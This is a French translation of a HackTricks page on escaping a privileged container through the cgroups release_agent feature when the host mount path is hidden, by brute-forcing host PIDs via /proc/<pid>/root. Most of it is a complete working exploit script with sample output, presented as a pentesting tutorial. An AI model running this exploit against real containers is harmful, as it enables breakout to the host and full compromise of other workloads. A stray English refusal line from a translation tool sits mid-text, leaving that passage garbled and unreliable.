<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Introduction

Les PoCs pr√©c√©dents fonctionnent bien lorsque le conteneur est configur√© avec un pilote de stockage qui expose le **chemin complet de l'h√¥te du point de montage**, par exemple `overlayfs`, cependant il existe des configurations qui n'ont **pas clairement divulgu√© le point de montage du syst√®me de fichiers h√¥te**.

Dans ce PoC, au lieu d'utiliser le chemin o√π se trouve le conteneur √† l'int√©rieur du syst√®me de fichiers de l'h√¥te, nous allons d√©couvrir un PID de conteneur √† l'int√©rieur de l'h√¥te. 

## Exemples de conteneurs ne divulguant pas l'emplacement du chemin √† l'int√©rieur de l'h√¥te

### Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
Par d√©faut, [Kata Containers](https://katacontainers.io) monte le syst√®me de fichiers racine d'un conteneur sur `9pfs`. Cela ne divulgue aucune information sur l'emplacement du syst√®me de fichiers du conteneur dans la machine virtuelle Kata Containers.

### Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
J'ai vu un conteneur avec ce montage racine dans un environnement en direct, je crois que le conteneur fonctionnait avec une configuration de pilote de stockage `devicemapper` sp√©cifique, mais √† ce stade, je n'ai pas √©t√© en mesure de reproduire ce comportement dans un environnement de test.

# PoC

La seule information cl√© requise est le **chemin complet, relatif √† l'h√¥te du conteneur, d'un fichier √† ex√©cuter dans le conteneur**. Sans √™tre en mesure de discerner cela √† partir des points de montage dans le conteneur, nous devons chercher ailleurs.

## /proc/\<pid>/root

Le pseudo-syst√®me de fichiers `/proc` de Linux expose les structures de donn√©es de processus du noyau pour tous les processus en cours d'ex√©cution sur un syst√®me, y compris ceux s'ex√©cutant dans diff√©rents espaces de noms, par exemple dans un conteneur. Cela peut √™tre d√©montr√© en ex√©cutant une commande dans un conteneur et en acc√©dant au r√©pertoire `/proc` du processus sur l'h√¥te : Conteneur
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
√Ä titre d'information, la structure de donn√©es `/proc/<pid>/root` m'a longtemps laiss√© perplexe, je ne comprenais pas pourquoi avoir un lien symbolique vers `/` √©tait utile, jusqu'√† ce que je lise la d√©finition r√©elle dans les pages de manuel :

> /proc/\[pid]/root
>
> UNIX et Linux supportent l'id√©e d'une racine de syst√®me de fichiers par processus, d√©finie par l'appel syst√®me chroot(2). Ce fichier est un lien symbolique qui pointe vers le r√©pertoire racine du processus, et se comporte de la m√™me mani√®re que exe et fd/\*.
>
> Notez cependant que ce fichier n'est pas simplement un lien symbolique. Il fournit la m√™me vue du syst√®me de fichiers (y compris les espaces de noms et l'ensemble des montages par processus) que le processus lui-m√™me.

Le lien symbolique **`/proc/<pid>/root` peut √™tre utilis√© comme un chemin relatif √† l'h√¥te vers n'importe quel fichier dans un conteneur** :
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
{% hint style="warning" %}
**Cela change la condition requise pour l'attaque, passant de la connaissance du chemin complet, relatif √† l'h√¥te du conteneur, d'un fichier dans le conteneur, √† la connaissance du pid de n'importe quel processus en cours d'ex√©cution dans le conteneur.**
{% endhint %}

## Bashage de Pid <a href="#pid-bashing" id="pid-bashing"></a>

C'est en fait la partie facile, les identifiants de processus dans Linux sont num√©riques et attribu√©s s√©quentiellement. Le processus `init` est attribu√© √† l'identifiant de processus `1` et tous les processus suivants sont attribu√©s √† des identifiants incr√©mentaux. Pour identifier le **pid de processus h√¥te d'un processus dans un conteneur, une recherche incr√©mentale par force brute peut √™tre utilis√©e** :
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
I'm sorry, I cannot provide you with a translation without the original English text. Please provide me with the English text you want me to translate.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
## Mettre le tout ensemble <a href="#putting-it-all-together" id="putting-it-all-together"></a>

Pour mener √† bien cette attaque, la technique de force brute peut √™tre utilis√©e pour **deviner le PID pour le chemin `/proc/<pid>/root/payload.sh`**, avec **chaque it√©ration** √©crivant le chemin PID devin√© **dans le fichier `release_agent` des cgroups, d√©clenchant le `release_agent`**, et v√©rifiant si un fichier de sortie est cr√©√©.

Le seul inconv√©nient de cette technique est qu'elle n'est en aucun cas subtile et peut augmenter consid√©rablement le nombre de PID. Comme aucun processus de longue dur√©e n'est maintenu en cours d'ex√©cution, cela ne devrait pas causer de probl√®mes de fiabilit√©, mais ne me citez pas l√†-dessus.

Le PoC ci-dessous met en ≈ìuvre ces techniques pour fournir une attaque plus g√©n√©rique que celle pr√©sent√©e initialement dans le PoC original de Felix pour s'√©chapper d'un conteneur privil√©gi√© en utilisant la fonctionnalit√© **`release_agent` des cgroups** :
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
L'ex√©cution du PoC dans un conteneur privil√©gi√© devrait fournir une sortie similaire √†:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# R√©f√©rences

* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
